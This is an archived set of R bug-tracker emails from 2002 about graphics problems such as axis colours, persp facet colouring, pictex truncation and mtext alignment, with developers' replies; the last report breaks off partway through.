postscript(file='f:/ecog/statpres/webreg/plot3.ps',pointsize=18)
par(font=2,font.axis=2,font.lab=2,lwd=2.5,bg='midnightblue',col='white',
    col.axis='white',col.main='white',col.lab='white',col.sub='white')
palette(c('white','red','yellow','green','cyan','orange'))
plot(u1,u2,type='n',xlab="Time",ylab='Proportion',main='',
     col='white',col.axis='white') 
points(u1,u2,col=3)
dev.off()


==> 1470.reply.1 <==
From p.dalgaard@biostat.ku.dk  Sat Apr 20 23:44:31 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA19457;
	Sat, 20 Apr 2002 23:44:30 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g3KLfHw01736;
	Sat, 20 Apr 2002 23:41:17 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: gray@jimmy.harvard.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] color of axis lines (PR#1470)
References: <200204202021.WAA19319@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 20 Apr 2002 23:41:17 +0200
In-Reply-To: <200204202021.WAA19319@pubhealth.ku.dk>
Message-ID: <x2d6wucaki.fsf@blueberry.kubism.ku.dk>
Lines: 34
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

gray@jimmy.harvard.edu writes:

> Full_Name: Robert Gray
> Version: 1.4.1
> OS: Windows NT 4.0
> Submission from: (NULL) (155.52.45.116)
> 
> 
> I can't seem to get axis tick marks in any color except black (I want to make
> plots for a slide presentation using a dark background.)  Below is a simple
> example.  I have tried this using postscript in the Windows version of R 1.4.1
> and a version of R 1.4.0 compiled on a Sun-Solaris system.  Also, the same
> problem occurs in the win.metafile driver.
> 
> u1 <- runif(10)
> u2 <- runif(10)
> postscript(file='f:/ecog/statpres/webreg/plot3.ps',pointsize=18)
> par(font=2,font.axis=2,font.lab=2,lwd=2.5,bg='midnightblue',col='white',
>     col.axis='white',col.main='white',col.lab='white',col.sub='white')
> palette(c('white','red','yellow','green','cyan','orange'))
> plot(u1,u2,type='n',xlab="Time",ylab='Proportion',main='',
>      col='white',col.axis='white') 
> points(u1,u2,col=3)
> dev.off()

You're looking for the fg parameter. 

(It does say so in help(par), I don't think there's a bug.)

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1470.audit <==
Tue Apr 23 19:32:19 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1476 *
Subject: Bug: persp and colors
From: oliver.niggemann@acterna.com
Date: Tue, 23 Apr 2002 09:41:37 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1476 <==
From oliver.niggemann@acterna.com  Tue Apr 23 09:41:41 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA02648
	for <R-bugs@biostat.ku.dk>; Tue, 23 Apr 2002 09:41:37 +0200 (MET DST)
Date: Tue, 23 Apr 2002 09:41:37 +0200 (MET DST)
From: oliver.niggemann@acterna.com
Message-Id: <200204230741.JAA02648@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Bug: persp and colors

Full_Name: Oliver Niggemann
Version: Windows 1.4 patched
OS: Windows NT 4.0
Submission from: (NULL) (141.169.250.14)


Hello,

I am working with the persp command. I want to change to color of the facets
according
to their z-value. The colors seems to be transposed, i.e. the color of a facet A
seems
to be used for a facet B which is a (defined?) way off....

An example:

nx <- 21 
ny <- 21 
x <- seq(-1, 1, length = nx) 
y <- seq(-1, 1, length = ny)
z <- outer(x, y, function(x,y) x^2 + y^2) 
hgt <- z / max(z) 
persp(x, y, z, col = gray(1 - hgt), theta = 70, phi = 40, expand = 0.4)

Now the z-value should define the color, but the color pattern seems to be
moved.

Thanks,
    Oliver Niggemann

 

==> 1476.audit <==
Tue Apr 23 19:32:19 2002	ripley	moved from incoming to Graphics

==> 1476.followup.1 <==
From p.murrell@auckland.ac.nz  Wed Apr 24 02:08:19 2002
Received: from mailhost2.auckland.ac.nz (mailhost2.auckland.ac.nz [130.216.191.4] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id CAA10482
	for <R-bugs@biostat.ku.dk>; Wed, 24 Apr 2002 02:08:12 +0200 (MET DST)
Received: from mailhost.auckland.ac.nz (IDENT:mirapoint@mailhost.auckland.ac.nz [130.216.191.61])
	by mailhost2.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id MAA02626;
	Wed, 24 Apr 2002 12:07:17 +1200 (NZST)
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost.auckland.ac.nz (Mirapoint Messaging Server MOS 2.9.3.2)
	with ESMTP id ACI17605;
	Wed, 24 Apr 2002 12:07:12 +1200 (NZST)
Received: from murrell (murrell.stat.auckland.ac.nz [130.216.50.118])
	by stat1.stat.auckland.ac.nz (8.11.6+Sun/8.8.8) with SMTP id g3O07BI27906;
	Wed, 24 Apr 2002 12:07:11 +1200 (NZST)
Message-ID: <010e01c1eb24$0fef5e20$7632d882@stat.auckland.ac.nz>
From: "Paul Murrell" <p.murrell@auckland.ac.nz>
To: <oliver.niggemann@acterna.com>, <r-devel@stat.math.ethz.ch>
Cc: <R-bugs@biostat.ku.dk>
References: <200204230741.JAA02655@pubhealth.ku.dk>
Subject: Re: [Rd] Bug: persp and colors (PR#1476)
Date: Wed, 24 Apr 2002 12:07:46 +1200
MIME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 5.50.4522.1200
X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1200

Hi


> I am working with the persp command. I want to change to color of the
facets
> according
> to their z-value. The colors seems to be transposed, i.e. the color of a
facet A
> seems
> to be used for a facet B which is a (defined?) way off....
>
> An example:
>
> nx <- 21
> ny <- 21
> x <- seq(-1, 1, length = nx)
> y <- seq(-1, 1, length = ny)
> z <- outer(x, y, function(x,y) x^2 + y^2)
> hgt <- z / max(z)
> persp(x, y, z, col = gray(1 - hgt), theta = 70, phi = 40, expand = 0.4)
>
> Now the z-value should define the color, but the color pattern seems to be
> moved.


I don't think this is a bug -- I think the problem is that the surface
produced for the z of dimension 21x21 has only 20x20 facets.  For example,
the following is not a solution, but it shows that a 20x20 colour matrix
produces the expected result ...

    persp(x, y, z, col = gray(hgt[1:20,1:20]), theta = 0, phi = 40, expand =
0.4)

... now, what you really want I guess is to calculate hgt to be some
interpolation of the four z values at the four corners of each face.  I am
due somewhere so this calculation is left as an exercise ...

Paul


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1505 *
Subject: pictex 
From: luchini@ehess.cnrs-mrs.fr
Date: Thu, 2 May 2002 12:23:21 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1505 <==
From luchini@ehess.cnrs-mrs.fr  Thu May  2 12:23:22 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA03886
	for <R-bugs@biostat.ku.dk>; Thu, 2 May 2002 12:23:21 +0200 (MET DST)
Date: Thu, 2 May 2002 12:23:21 +0200 (MET DST)
From: luchini@ehess.cnrs-mrs.fr
Message-Id: <200205021023.MAA03886@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: pictex 

Full_Name: Stephane Luchini
Version: 1.4.1
OS: Redhat 7.2
Submission from: (NULL) (193.50.233.43)


I want to use R to plot an histogram of a vector of size 759 with min=-63260e+06

and max=3.700646.

When I use X11 as the output device, there is no problem to obtain the desired 
graphics using the following instructions:

hist(VED,br=60,prob=TRUE)
lines(density(VED,bw=7.668e+05))

Now, if I use the pictex driver :
pictex(file = "test.pictex")

The whole pictex code is not generated. It stops after line 760.
When I put debug = TRUE, it stops after 243 lines.

==> 1505.audit <==
Tue May  7 09:07:02 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1653 *
Subject: coplot behaviour
From: "RenE J.V. Bertin" <rjvbertin@hotmail.com>
Date: Mon, 10 Jun 2002 20:11:02 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1653 <==
From postmaster@franz.stat.wisc.edu  Mon Jun 10 20:12:01 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA26970
	for <r-bugs@biostat.ku.dk>; Mon, 10 Jun 2002 20:12:00 +0200 (MET DST)
Received: from hotmail.com (really [216.32.181.37]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17HTdO-000IXUC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Mon, 10 Jun 2002 13:11:18 -0500 (CDT) 
Received: from mail pickup service by hotmail.com with Microsoft SMTPSVC;
	 Mon, 10 Jun 2002 11:11:02 -0700
Received: from 193.52.22.12 by lw2fd.hotmail.msn.com with HTTP;
	Mon, 10 Jun 2002 18:11:02 GMT
X-Originating-IP: [193.52.22.12]
From: "RenE J.V. Bertin" <rjvbertin@hotmail.com>
To: r-bugs@r-project.org
Subject: coplot behaviour
Date: Mon, 10 Jun 2002 20:11:02 +0200
Mime-Version: 1.0
Content-Type: text/plain; format=flowed
Message-ID: <LAW2-F37t7rPEn1pgE00001da40@hotmail.com>
X-OriginalArrivalTime: 10 Jun 2002 18:11:02.0564 (UTC) FILETIME=[2E370E40:01C210AA]
Content-Transfer-Encoding: 8bit

Another one, using the same data as in my previous report (PR1651, available 
as http://rjvbertin.free.fr/PR1651data.tab):

kk<-read.table(<data>)
attach(kk)
Snr<-factor(Snr)
# Now try to make a coplot using boxplots:
coplot(nFD~Modality|Type+size, panel = function(x, y, ...) plot(x, y))
# or
coplot(nFD~Modality|Type+size, panel = function(x, y, ...) boxplot(y~x))

This almost functions,only the boxplot matrix is shifted and right-aligned 
with the vertical (size) factor display (seems to be drawn underneath it).
This happens both with the Windows binaries and the source distribution 
compiled under Linux.

RenE J.V. Bertin
College de France/LPPA
11, place Marcelin Berthelot
75005 Paris, France

_________________________________________________________________
Join the worlds largest e-mail service with MSN Hotmail. 
http://www.hotmail.com


==> 1653.audit <==
Wed Jun 12 17:37:50 2002	ripley	foobar
Wed Jun 12 17:37:50 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1654 *
Subject: R 1.5.0: axis() does not honor the xaxp argument
From: "Robert D. Merithew" <merithew@ccmr.cornell.edu>
Date: Tue, 11 Jun 2002 09:29:39 -0400 (EDT)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1654 <==
From postmaster@franz.stat.wisc.edu  Tue Jun 11 16:33:40 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA04905
	for <r-bugs@biostat.ku.dk>; Tue, 11 Jun 2002 16:33:40 +0200 (MET DST)
Received: from mercury.ccmr.cornell.edu (really [128.84.231.97]) by franz.stat.wisc.edu
	via smail with esmtp (ident 0 using rfc1413)
	id <m17HmaZ-000IYKC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Tue, 11 Jun 2002 09:25:39 -0500 (CDT) 
Received: from magic.ccmr.cornell.edu (IDENT:0@magic.ccmr.cornell.edu [128.84.231.181])
	by mercury.ccmr.cornell.edu (8.9.3/8.9.3) with ESMTP id JAA21476
	for <r-bugs@r-project.org>; Tue, 11 Jun 2002 09:33:13 -0400
Received: from localhost (merithew@localhost)
	by magic.ccmr.cornell.edu (8.9.3/8.9.3) with ESMTP id JAA12487
	for <r-bugs@r-project.org>; Tue, 11 Jun 2002 09:29:39 -0400
X-Authentication-Warning: magic.ccmr.cornell.edu: merithew owned process doing -bs
Date: Tue, 11 Jun 2002 09:29:39 -0400 (EDT)
From: "Robert D. Merithew" <merithew@ccmr.cornell.edu>
Reply-To: rdm28@cornell.edu
To: r-bugs@r-project.org
Subject: R 1.5.0: axis() does not honor the xaxp argument
Message-ID: <Pine.LNX.4.44.0206110918130.12431-100000@magic.ccmr.cornell.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII



----------------------- transcript --------------------------
$ R --vanilla

R : Copyright 2002, The R Development Core Team
Version 1.5.0  (2002-04-29)

R is free software and comes with ABSOLUTELY NO WARRANTY.
You are welcome to redistribute it under certain conditions.
Type `license()' or `licence()' for distribution details.

R is a collaborative project with many contributors.
Type `contributors()' for more information.

Type `demo()' for some demos, `help()' for on-line help, or
`help.start()' for a HTML browser interface to help.
Type `q()' to quit R.

> plot(c(0,1),c(0.2,0.3),xaxt="n")
> axis(1,xaxp=c(0,1,4))
> version
         _
platform i586-pc-linux-gnu
arch     i586
os       linux-gnu
system   i586, linux-gnu
status
major    1
minor    5.0
year     2002
month    04
day      29
language R
>
------------------------end transcript ---------------------

I expect only 4 intervals on the x-axis, but find 5 intervals.  The same
problem seems to exist for axis() with a yaxp argument.

The sequence:

> plot(c(0,1),c(0.2,0.3),xaxt="n")
> par(xaxp=c(0,1,4))
> axis(1)

does draw an axis with four intervals, though.


On R-Help, in response to my question about this, Paul Murrell
<p.murrell@auckland.ac.nz> wrote:

> This appears to be a bug.  axis() should respond to an "in-line" xaxp
> setting.
>
> I can see a place in the C code where the problem appears to be, but an
> attempted quick fix failed.
>
> Could you please submit a bug report so that I (or someone else) will
> remember to have a proper look later?
>
> Thanks
>
> Paul


Thanks,
--
Robert Merithew





==> 1654.followup.1 <==
From p.murrell@auckland.ac.nz  Wed Jun 12 00:04:30 2002
Received: from mailhost2.auckland.ac.nz (mailhost2.auckland.ac.nz [130.216.191.4] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA06582
	for <R-bugs@biostat.ku.dk>; Wed, 12 Jun 2002 00:04:28 +0200 (MET DST)
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost2.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id KAA25770
	for <R-bugs@biostat.ku.dk>; Wed, 12 Jun 2002 10:03:45 +1200 (NZST)
Received: from stat.auckland.ac.nz (murrell.stat.auckland.ac.nz [130.216.50.118])
	by stat1.stat.auckland.ac.nz (8.11.6+Sun/8.8.8) with ESMTP id g5BM3jI03971;
	Wed, 12 Jun 2002 10:03:45 +1200 (NZST)
Message-ID: <3D067451.59949C1C@stat.auckland.ac.nz>
Date: Wed, 12 Jun 2002 10:06:09 +1200
From: Paul Murrell <p.murrell@auckland.ac.nz>
X-Mailer: Mozilla 4.78 [en] (WinNT; U)
X-Accept-Language: en
MIME-Version: 1.0
CC: R-bugs@biostat.ku.dk
Subject: Re: R 1.5.0: axis() does not honor the xaxp argument (PR#1654)
References: <200206111433.QAA04910@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Hi


> ----------------------- transcript --------------------------
> $ R --vanilla
> 
> R : Copyright 2002, The R Development Core Team
> Version 1.5.0  (2002-04-29)
> 
> R is free software and comes with ABSOLUTELY NO WARRANTY.
> You are welcome to redistribute it under certain conditions.
> Type `license()' or `licence()' for distribution details.
> 
> R is a collaborative project with many contributors.
> Type `contributors()' for more information.
> 
> Type `demo()' for some demos, `help()' for on-line help, or
> `help.start()' for a HTML browser interface to help.
> Type `q()' to quit R.
> 
> > plot(c(0,1),c(0.2,0.3),xaxt="n")
> > axis(1,xaxp=c(0,1,4))
> > version
>          _
> platform i586-pc-linux-gnu
> arch     i586
> os       linux-gnu
> system   i586, linux-gnu
> status
> major    1
> minor    5.0
> year     2002
> month    04
> day      29
> language R
> >
> ------------------------end transcript ---------------------
> 
> I expect only 4 intervals on the x-axis, but find 5 intervals.  The same
> problem seems to exist for axis() with a yaxp argument.
> 
> The sequence:
> 
> > plot(c(0,1),c(0.2,0.3),xaxt="n")
> > par(xaxp=c(0,1,4))
> > axis(1)
> 
> does draw an axis with four intervals, though.
> 
> On R-Help, in response to my question about this, Paul Murrell
> <p.murrell@auckland.ac.nz> wrote:
> 
> > This appears to be a bug.  axis() should respond to an "in-line" xaxp
> > setting.
> >
> > I can see a place in the C code where the problem appears to be, but an
> > attempted quick fix failed.


For the record, the place in the C code is in plot.c in do_axis where
there appear to be two problems:  (i)  the code sets a local variable
from the dpptr(dd)->xaxp rather than the gpptr(dd)->xaxp, and (ii) the
code sets this local variable BEFORE calling ProcessInlinePars().  So
there are two obstacles to fix before do_axis will respond to an in-line
xaxp setting.  NOTE also that several other local variables are set from
dpptr(dd)-><something> in the same place, so these should be fixed as
well.

Paul

==> 1654.audit <==
Wed Jun 12 17:36:35 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1659 *
Subject:  mtext() alignment of perpendicular text 
From: p.murrell@auckland.ac.nz
Date: Wed, 12 Jun 2002 13:29:45 +1200 (NZST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1659 <==
From postmaster@franz.stat.wisc.edu  Wed Jun 12 03:30:31 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id DAA06869
	for <r-bugs@biostat.ku.dk>; Wed, 12 Jun 2002 03:30:30 +0200 (MET DST)
Received: from mailhost2.auckland.ac.nz (really [130.216.191.4]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17HwxI-000IXcC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Tue, 11 Jun 2002 20:29:48 -0500 (CDT) 
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost2.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id NAA27667
	for <r-bugs@r-project.org>; Wed, 12 Jun 2002 13:29:46 +1200 (NZST)
Received: (from paul@localhost)
	by stat1.stat.auckland.ac.nz (8.11.6+Sun/8.8.8) id g5C1TjS23236;
	Wed, 12 Jun 2002 13:29:45 +1200 (NZST)
Date: Wed, 12 Jun 2002 13:29:45 +1200 (NZST)
Message-Id: <200206120129.g5C1TjS23236@stat1.stat.auckland.ac.nz>
From: p.murrell@auckland.ac.nz
To: r-bugs@r-project.org
Cc: paul@stat1.stat.auckland.ac.nz
Subject:  mtext() alignment of perpendicular text 


mtext() does a poor job of placing text when it is perpendicular (e.g.,
side=1, las=3) and the font size is not the default.

The following code snippet demonstrates the problem ...

plot(1:10)
abline(v=1:10, col="grey")
axis(3, at=1:10, las=3, labels=FALSE)
mtext(1:10, at=1:10, side=3, line=1, las=3)
axis(3, line=-2, at=1:10, las=3, labels=FALSE)
mtext(1:10, at=1:10, side=3, line=-1, las=3, cex=.5)
axis(3, line=-5, at=1:10, las=3, labels=FALSE)
mtext(1:10, at=1:10, side=3, line=-4, las=3, cex=2)

The ugliness varies a bit across devices.

In GMtext() in graphics.c there is a hardcoded adjustment of 0.3 which
is described as "purely visual tuning".  I think this needs to be
replaced with a more general solution.

Paul


--please do not edit the information below--

Version:
 platform = sparc-sun-solaris2.7
 arch = sparc
 os = solaris2.7
 system = sparc, solaris2.7
 status = Under development (unstable)
 major = 1
 minor = 6.0
 year = 2002
 month = 06
 day = 10
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base

==> 1659.audit <==
Wed Jun 12 17:36:35 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1878 *
Subject: close.screen
From: Martin.Schlather@uni-bayreuth.de
Date: Mon, 5 Aug 2002 22:35:02 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1878 <==
From Martin.Schlather@uni-bayreuth.de  Mon Aug  5 22:35:03 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA18778
	for <R-bugs@biostat.ku.dk>; Mon, 5 Aug 2002 22:35:02 +0200 (MET DST)
Date: Mon, 5 Aug 2002 22:35:02 +0200 (MET DST)
From: Martin.Schlather@uni-bayreuth.de
Message-Id: <200208052035.WAA18778@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: close.screen

Full_Name: Martin Schlather
Version: 1.5.1
OS: Linux
Submission from: (NULL) (132.180.72.150)


Hi,

As a user it is not obvious to me why
"close.screen" should return a warning message in 

split.screen(figs=c(1,2))
i <- 2  
screen(i)
close.screen(i)

whereas no warning message appears for i <- 1.


In fact, the warning message appears since the condition
   .split.valid.screens >  temp
in close.screen is not satisfied by any element of .split.valid.screens

Replacing 

   if (temp %in% n) 
       temp <- min(.split.valid.screens[.split.valid.screens > 
           temp])
   if (temp > max(.split.valid.screens)) 
       temp <- min(.split.valid.screens)

by

   if (temp > max(.split.valid.screens)) 
      temp <- min(.split.valid.screens)
   else
      if (temp %in% n) 
         temp <- min(.split.valid.screens[.split.valid.screens > 
             temp])

should avoid the warning message without any other changings in the
functionality of close.screen.

Cheers,
Martin




==> 1878.audit <==
Thu Aug  8 09:04:26 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1899 *
Subject: interaction.plot() legend too narrow when mfcol > 2
From: Martin Maechler <maechler@stat.math.ethz.ch>
Date: Tue, 13 Aug 2002 09:36:15 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1899 <==
From maechler@stat.math.ethz.ch  Tue Aug 13 09:37:07 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA06366
	for <R-bugs@biostat.ku.dk>; Tue, 13 Aug 2002 09:37:07 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id JAA14584
	for <r-bugs@hypatia>; Tue, 13 Aug 2002 09:36:10 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa003WY; Tue Aug 13 09:36:01 2002
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id g7D7aFu13171;
	Tue, 13 Aug 2002 09:36:15 +0200
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15704.46831.321217.179123@gargle.gargle.HOWL>
Date: Tue, 13 Aug 2002 09:36:15 +0200
To: R-bugs@stat.math.ethz.ch
Subject: interaction.plot() legend too narrow when mfcol > 2
X-Mailer: VM 7.07 under Emacs 21.2.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

Here is an example:

 The legends (mainly the factor level names) are cut off on the
 right.  Somehow the internal calculation which computes
 horizontal space for the legend is not flexible enough.

## Call a new graphics window {with default par()s !}:
get(getOption("device"))()
par(mfrow = c(2,2))

## part of  example(interaction.plot)  _improved_ using with() :
data(OrchardSprays)
with(OrchardSprays, {
    interaction.plot(treatment, rowpos, decrease)
    interaction.plot(rowpos, treatment, decrease)
})

data(esoph)
with(esoph, {
    interaction.plot(agegp, alcgp, ncases/ncontrols)
    interaction.plot(agegp, tobgp, ncases/ncontrols, trace.label="tobacco",
                     fixed=TRUE)
})

-------------------------------

Something that should be easy to fix, but needs some care (and
time). 
Volunteers?

Martin Maechler <maechler@stat.math.ethz.ch>	http://stat.ethz.ch/~maechler/
Seminar fuer Statistik, ETH-Zentrum  LEO C16	Leonhardstr. 27
ETH (Federal Inst. Technology)	8092 Zurich	SWITZERLAND
phone: x-41-1-632-3408		fax: ...-1228			<><


==> 1899.followup.1 <==
From ligges@amadeus.statistik.uni-dortmund.de  Sat Aug 17 18:49:20 2002
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA09869
	for <R-bugs@biostat.ku.dk>; Sat, 17 Aug 2002 18:49:19 +0200 (MET DST)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Sat, 17 Aug 2002 18:48:39 +0200
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.11.6+Sun/8.11.6) with ESMTP id g7HGmd722582;
	Sat, 17 Aug 2002 18:48:39 +0200 (MET DST)
Message-ID: <3D5E7E96.E9501D6F@statistik.uni-dortmund.de>
Date: Sat, 17 Aug 2002 18:49:26 +0200
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
X-Mailer: Mozilla 4.79 [en] (WinNT; U)
X-Accept-Language: en
MIME-Version: 1.0
To: maechler@stat.math.ethz.ch
CC: r-bugs <R-bugs@biostat.ku.dk>
Subject: Re: interaction.plot() legend too narrow when mfcol > 2 (PR#1899)
References: <200208130737.JAA06371@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

maechler@stat.math.ethz.ch wrote:
> 
> Here is an example:
> 
>  The legends (mainly the factor level names) are cut off on the
>  right.  Somehow the internal calculation which computes
>  horizontal space for the legend is not flexible enough.
> 
> ## Call a new graphics window {with default par()s !}:
> get(getOption("device"))()
> par(mfrow = c(2,2))
> 
> ## part of  example(interaction.plot)  _improved_ using with() :
> data(OrchardSprays)
> with(OrchardSprays, {
>     interaction.plot(treatment, rowpos, decrease)
>     interaction.plot(rowpos, treatment, decrease)
> })
> 
> data(esoph)
> with(esoph, {
>     interaction.plot(agegp, alcgp, ncases/ncontrols)
>     interaction.plot(agegp, tobgp, ncases/ncontrols, trace.label="tobacco",
>                      fixed=TRUE)
> })
> 
> -------------------------------
> 
> Something that should be easy to fix, but needs some care (and
> time).
> Volunteers?

Martin, 

not right now (may be easy, but obviously not very easy ;-)). 
I'd like to comment that I filed this already as bug report #1305,
including a suggestion for a fix for a second bug related to axis
annotation.

Best,
Uwe

==> 1899.audit <==
Mon Aug 19 22:34:22 2002	thomas	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1933 *
Subject: dev2eps() prints ticks with wrong length!
From: Timur Elzhov <Timur.Elzhov@jinr.ru>
Date: Fri, 23 Aug 2002 17:22:15 +0400
--dev.copy problem
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1933 <==
From postmaster@franz.stat.wisc.edu  Fri Aug 23 15:15:27 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA23911
	for <r-bugs@biostat.ku.dk>; Fri, 23 Aug 2002 15:15:26 +0200 (MET DST)
Received: from nfsun5.jinr.ru (really [159.93.21.8]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17iEH0-000IWqC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Fri, 23 Aug 2002 08:14:46 -0500 (CDT) 
Received: from pcf004.jinr.ru (pcf004.jinr.ru [159.93.29.4])
	by nfsun5.jinr.ru (8.11.2/8.11.6) with ESMTP id g7NDEZX20985
	for <r-bugs@r-project.org>; Fri, 23 Aug 2002 17:14:36 +0400 (MSK-DST)
Received: from etv by pcf004.jinr.ru with local (Exim 3.32 #1 (Debian))
	id 17iEOH-0003OH-00
	for <r-bugs@r-project.org>; Fri, 23 Aug 2002 17:22:17 +0400
Date: Fri, 23 Aug 2002 17:22:15 +0400
From: Timur Elzhov <Timur.Elzhov@jinr.ru>
To: r-bugs@r-project.org
Subject: dev2eps() prints ticks with wrong length!
Message-ID: <20020823132214.GA13023@pcf004.jinr.ru>
Mime-Version: 1.0
Content-Type: text/plain; charset=koi8-r
Content-Disposition: inline
User-Agent: Mutt/1.4i
Sender: Timur Elzhov <etv@pcf004.jinr.ru>

Hello R experts!

I've tried to make single plot, but with changed ticks length,
and then copy them to file by dev.copy2eps(). Here is the code:

   x11 ( , 5, 5)
   par (tcl = +5) 
   plot (0)        # that's ugly plot with great ticks
                   # on the graph viewport.  cool :)
   dev.copy2eps (file = "out.eps")

Hm.. I had a look at "out.ps" and wondered that ticks
look like as they would being set to there *default* value,
"tcl" = -0.5!  =-O

Ok, I tried then to make same thing by slightly different way:

    postscript (file = "out1.eps", onefile = FALSE)
    par (tcl = +5)
    plot (0)
    dev.off ()

